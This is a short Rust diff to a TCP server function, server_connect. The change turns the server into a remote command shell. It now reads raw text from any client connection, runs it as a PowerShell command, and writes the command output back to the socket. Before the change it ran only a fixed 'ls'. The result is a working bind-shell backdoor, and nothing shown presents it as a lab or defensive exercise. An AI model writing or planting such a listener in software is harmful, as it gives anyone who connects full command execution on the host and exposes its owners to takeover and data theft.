@@ -1,5 +1,5 @@
 use std::net::{TcpListener, TcpStream};
-use std::io::{Read, Write};
+use std::io::{Read, Write, self};
 use std::process::Command;
 
 //V
@@ -15,17 +15,17 @@ pub fn server_connect() {
 		let mut buffer = [0; 1024];
 		
 		stream.read(&mut buffer).unwrap();
-		let mut input = String::from_utf8_lossy(&buffer[..]).trim().to_string();
+		let mut input = String::from_utf8_lossy(&buffer[..]).trim_matches(char::from(0)).to_string();
 
 		println!("{}", input);
 
-		let mut output = Command::new("cmd")
-			.arg("ls")
+		let mut output = Command::new("powershell")
+			.arg(input)
 			.output()
 			.expect("No");
 
-		//stream.write_all(&output.stdout);
-		//println!("no");
+		let s = io::stdout().write_all(&output.stdout).unwrap();
+		stream.write_all(&output.stdout);
 	}
 }
 
